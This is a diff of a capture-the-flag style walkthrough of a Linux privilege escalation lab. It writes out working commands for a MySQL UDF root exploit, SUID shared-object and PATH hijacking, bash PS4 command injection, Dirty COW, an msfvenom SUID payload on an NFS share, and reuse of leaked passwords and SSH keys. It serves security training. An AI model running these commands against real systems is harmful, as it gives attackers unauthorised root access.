@@ -48,34 +48,89 @@ ssh user@10.10.42.225
 
 ### Service Exploits
 
-cd /home/user/tools/mysql-udf
-gcc -g -c raptor_udf2.c -fPIC
-gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
-mysql -u root
-use mysql;
-create table foo(line blob);
-insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
-select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
-create function do_system returns integer soname 'raptor_udf2.so';
-select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
-./rootbash -p
-rm rootbash
-
+In this taask we will exploit the fact that the MySQL service runs as root and this user doesn't have a password assigned to it.
 
 *Read and follow along with the above.*
 
-![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Create_Function.png)
-![Create Table](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Create_Table.png)
+First we navigate to the folder containing the exploit files.
+
+```cmd
+cd /home/user/tools/mysql-udf
+```
+
+Now we compile the exploit code with the following code:
+
+```cmd
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
 ![First Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_First_Compile.png)
-![Go Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Go_Rootbash.png)
-![Insert Values](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Insert_Values.png)
-![Remove Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Remove_Rootbash.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Root_Shell.png)
+
 ![Second Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Second_Compile.png)
-![Select](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Select.png)
-![Select Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Select_Function.png)
+
+Now we can connect to the MySQL service as the root user with a blank password.
+
+```cmd
+mysql -u root
+```
+
 ![Start Mysql](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Start_Mysql.png)
 
+First we create a new table in the `mysql` database:
+
+```cmd
+use mysql;
+create table foo(line blob);
+```
+
+![Create Table](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Create_Table.png)
+
+Then we insert the exploit code into the table and dump the output.
+
+```cmd
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+```
+
+![Insert Values](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Insert_Values.png)
+
+![Select](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Select.png)
+
+Lastly, we creat a User Defined Function 'do_system'.
+
+```cmd
+create function do_system returns integer soname 'raptor_udf2.so';
+```
+
+![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Create_Function.png)
+
+Now we can user this function to copy /bin/bash to /tmp/rootbash.
+
+```cmd
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+
+![Select Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Select_Function.png)
+
+Finally, we can navigate to the copied file and with it to get a root shell.
+
+![Go Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Go_Rootbash.png)
+
+```cmd
+./rootbash -p
+```
+
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Root_Shell.png)
+
+After we are finished, we should remove the file again.
+
+```cmd
+.rm rootbash
+exit
+```
+
+![Remove Rootbash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Service_Exploits_Remove_Rootbash.png)
 
 ### Weak File Permissions - Readable /etc/shadow
 
@@ -595,106 +650,161 @@ chmod +x cve-2016-1531.sh
 
 ### SUID / SGID Executables - Shared Object Injection
 
-![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Create_Object.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Root_Shell.png)
-![SUID So](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_SUID_SO.png)
-![Strace](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Strace.png)
+In this task we exploit an executable that is vulnerable to shared object injection.
 
 *Read and follow along with the above.*
+
+The /usr/local/bin/suid-so executbale is vulnerable and when running it will give a progress bar.
 
 ```cmd
 /usr/local/bin/suid-so
 ```
+
+![SUID So](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_SUID_SO.png)
+
+We now run `strace` to search the file for open/access calls and 'no such file' errors.
+
 ```cmd
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
 ```
+
+![Strace](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Strace.png)
+
+Now we create the folder in which it is looking for a file (libcalc.so).
 
 ```cmd
 mkdir /home/user/.config
 ```
 
+Next, we compile a shared object that will give us a root shell.
+
 ```cmd
 gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
 ```
+
+![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Create_Object.png)
+
+If we now run the executable again, we get a rootshell instead.
 
 ```cmd
 /usr/local/bin/suid-so
 ```
 
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Root_Shell.png)
+
 ### SUID / SGID Executables - Environment Variables
 
-![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Create_Object.png)
-![Patch](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Path.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Root_Shell.png)
-![SUID Env](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_SUID_ENV.png)
-![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Strings.png)
+In this task we exploit an executable due to it inheriting the user's PATH environment variable.
 
 *Read and follow along with the above.*
+
+First, we run the file to see what it tries to run.
 
 ```cmd
 /usr/local/bin/suid-env
 ```
+
+![SUID Env](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_SUID_ENV.png)
+
+Looks like it tries running apache2 webservers. Running the following command we look for anything related to apache2.
 
 ```cmd
 strings /usr/local/bin/suid-env
 ```
 
+![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Strings.png)
+
+The full path for the apache2 service is not used. So we create an executable that will be run inplace of the real one.
+
 ```cmd
 gcc -o service /home/user/tools/suid/service.c
 ```
+
+![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Create_Object.png)
+
+Now we must add the current directory to the PATH variable.
 
 ```cmd
 PATH=.:$PATH /usr/local/bin/suid-env
 ```
 
+![Path](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Path.png)
+
+Finally, we can run the executable again to get a root shell.
+
 ```cmd
 /usr/local/bin/suid-env
 ```
 
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Root_Shell.png)
+
 ### SUID / SGID Executables - Abusing Shell Features (#1)
 
-![Bash Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/ABusing_Shell_Features_1_Bash_Version.png)
-![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Create_Function.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Root_Shell.png)
-![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Strings.png)
-
-*Read and follow along with the above.*
+In this task we have a similar situation as the previous one. Only this time the executable uses the absolute path.
 
 ```cmd
 /usr/local/bin/suid-env2
 ```
 
+*Read and follow along with the above.*
+
+We can verify this we the following command:
+
 ```cmd
 strings /usr/local/bin/suid-env2
 ```
 
+![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Strings.png)
+
+We need to check the bash version as well as prior to 4.2-048 we can define a shell function with a name that resembles file paths.
+
 ```cmd
 /bin/bash --version
 ```
+
+![Bash Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/ABusing_Shell_Features_1_Bash_Version.png)
+
+Now, we create a bash function `/usr/sbin/service` that executes a bash shell.
 
 ```cmd
 function /usr/sbin/service { /bin/bash -p; }
 export -f /usr/sbin/service
 ```
 
+![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Create_Function.png)
+
+Finally, we can run the executable to get a root shell.
+
 ```cmd
 /usr/local/bin/suid-env2
 ```
 
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Root_Shell.png)
+
 ### SUID / SGID Executables - Abusing Shell Features (#2)
+
+In this task we will exploit a debugging feature in bash 4.3 and prior.
 
 *Read and follow along with the above.*
 
-![Bash Debugging](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Bash_Debugging.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Root_Shell.png)
-
+First, we run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
 
 ```cmd
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
+
+![Bash Debugging](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Bash_Debugging.png)
+
+Now we can run the executable to get a root shell.
+
 ```cmd
 /tmp/rootbash -p
 ```
+
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Root_Shell.png)
+
+After we are finished, we should remove the file for this challenge.
+
 ```cmd
 rm /tmp/rootbash
 exit
@@ -702,162 +812,254 @@ exit
 
 ### Passwords & Keys - History Files
 
-![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_Contents.png)
-![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_File.png)
-![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_Root.png)
-
+In this task we utilize commands being saved in a file and accidentally entered credentials.
 
 1. What is the full mysql command the user executed?
 
+   We can look at the history of commands typed with the following command:
+   
    ```cmd
    cat ~/.*history | less
    ```
+   
+   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_Contents.png)
+
+   This efectively looks through all files with 'history' in its name.
+   
+   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_File.png)
+   
+   With the credentials we found here, we can switch to the root user.
+   
    ```cmd
    su root
    ```
-
+   
+   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_Root.png)
+   
    ><details><summary>Click for answer</summary>mysql -h somehost.local -uroot -ppassword123</details>
 
 ### Passwords & Keys - Config Files
 
-![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Contents.png)
-![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Credentials.png)
-![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_File.png)
-![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Root.png)
-
+In this task we use the fact that passwords may sometimes be stored in files as cleartext.
 
 1. What file did you find the root user's credentials in?   
 
+   Looking through the folder we can see there is a vpn config file.
+   
    ```cmd
    ls -lh ~
    ```
+   
+   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_File.png)
+   
+   We can read the file to see if we can find anything interesting.
+   
    ```cmd
    cat /home/user/myvpn.ovpn
    ```
+   
+   ![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Contents.png)
+   
+   Looks like there could be credentials stored in one of the files mentioned here.
+   
+   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Credentials.png)
+   
+   Now we can switch to the root user with this password.
+   
    ```cmd
    su root
    ```
+   
+   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Root.png)
 
    ><details><summary>Click for answer</summary>/etc/openvpn/auth.txt</details>
 
 ### Passwords & Keys - SSH Keys
 
+In this task we make use of lingering backup files with credentials.
+
 *Read and follow along with the above.*
 
-![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Contents.png)
-![Create Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Create_Key.png)
-![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Folder.png)
-![Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Key.png)
-![Permissions Change](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Permissions_Change.png)
-![Permissions Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Permissions_Error.png)
-![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Root.png)
 ```cmd
 ls -la /
 ```
+
+![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Folder.png)
+
+We can see several hidden folders, of which the following might be of interest.
+
 ```cmd
 ls -lh /.ssh
 ```
+
+![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Contents.png)
+
+Lets look at the key contents.
+
 ```cmd
 cat /.ssh/root_key
 ```
+
+![Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Key.png)
+
+With can copy this key to our attack machine to ssh into the target with it a get root access.
+
+![Create Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Create_Key.png)
+
+We must give the key the right permissions, otherwise the ssh client will not accept it.
+
+![Permissions Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Permissions_Error.png)
+
 ```cmd
 chmod 600 root_key 
 ```
+
+![Permissions Change](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Permissions_Change.png)
+
+Now it does work.
+
 ```cmd
 ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.65.67
 ```
 
+![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Root.png)
 
 ### NFS
 
-*Read and follow along with the above.*
-
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Chmod.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Exports.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Mount.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Msfvenom.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Root_Shell.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Root_Tmp.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Tmp_Folder.png
-
-
-```cmd
-cat /etc/exports
-```
-```cmd
-sudo su
-```
-```cmd
-mkdir /tmp/nfs
-```
-
-```cmd
-mount -o rw,vers=3 10.10.197.244:/tmp /tmp/nfs
-```
-```cmd
-sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
-sudo chmod +xs /tmp/nfs/shell.elf
-```
-
-```cmd
-ls -lh /tmp
-```
-```cmd
-/tmp/shell.elf
-```
+In this task we use tha fact that files created via NFS inherit the remote user's ID.
 
 1. What is the name of the option that disables root squashing?
 
+   First we check the NFS share configuration.
    
+   ```cmd
+   cat /etc/exports
+   ```
    
+   ![Exports](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Exports.png)
+   
+   It seems root squaching is not enabled.
+   
+   On our attack machine we switch to the root user and create a mount point.
+   
+   ```cmd
+   sudo su
+   mkdir /tmp/nfs
+   ```
+   
+   ![Root Tmp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Root_Tmp.png)
+   
+   Now we can mount the target machines `/tmp/` folder to our machine.
+   
+   ```cmd
+   mount -o rw,vers=3 10.10.197.244:/tmp /tmp/nfs
+   ```
+   
+   ![Mount](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Mount.png)
+   
+   Still on our attack machine we create a payload with msfvenom.
+   
+   ```cmd
+   sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+   sudo chmod +xs /tmp/nfs/shell.elf
+   ```
+   
+   ![Msfvenom](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Msfvenom.png)
+   
+   ![Chmod](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Chmod.png)
+   
+   We can check to see if the file is indeed in the `/tmp/` folder.
+   
+   ```cmd
+   ls -lh /tmp
+   ```
+   
+   ![Tmp Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Tmp_Folder.png)
+   
+   Finally, we can run this file from the target machine.
+   
+   ```cmd
+   /tmp/shell.elf
+   ```
+   
+   ![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/NFS_Root_Shell.png)
+      
    ><details><summary>Click for answer</summary>no_root_squash</details>
 
 ### Kernel Exploits
 
+In this task we look for any kernel exploits we can use on this machine. Dirty cow in this situation.
+
 *Read and follow along with the above.*
 
-![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Compile.png)
-![Dirty Cow](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Dirty_Cow.png)
-![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Remove.png)
-![Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Run_Exploit.png)
-![Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Suggester.png)
+First, we run the Linux Exploit Suggester 2 tool.
 
 ```cmd
 perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
 ```
+
+![Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Suggester.png)
+
+Looks like we can use the Dirty COQ exploit. Lets compile the code and run it.
 
 ```cmd
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 ./c0w
 ```
 
+![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Compile.png)
+
+![Dirty Cow](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Dirty_Cow.png)
+
+Now that the exploit has been run, we can run the passwd file to get a root shell.
+
 ```cmd
 /usr/bin/passwd
 ```
+
+![Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Run_Exploit.png)
+
+Lastly, we should remove the created files before we continue.
 
 ```cmd
 mv /tmp/bak /usr/bin/passwd
 exit
 ```
 
+![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Kernel_Exploits_Remove.png)
+
 ### Privilege Escalation Scripts 
+
+In this final task we experiment with some automation scripts that look for these privelege escalation methods. Most if not all of those we manually found are listed by these scripts. 
 
 *Read and follow along with the above.*
 
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_LSE.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_Lin_Enum.png
-https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_Linpeas.png
+In the `privesc-scripts` folder we find three automation scripts.
 
 ```cmd
 cd /home/user/tools/privesc-scripts
 ```
 
+Running LinEnum first, we can see everything it comes up with, including things we previously found. Like the SUID and SGID files.
+
 ```cmd
 ./LinEnum.sh
 ```
+
+![Lin Enum](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_Lin_Enum.png)
+
+Running Linpeas, we can see everything it comes up with, including things we previously found. Like the NFS root squashing.
+
 ```cmd
 ./linpeas.sh
 ```
+
+![Linpeas](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_Linpeas.png)
+
+Running LSE, we can see everything it comes up with, including things we previously found. Like sudo permissions.
+
 ```cmd
 ./lse.sh
 ```
+
+![LSE](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Priv_Esc_Scripts_LSE.png)
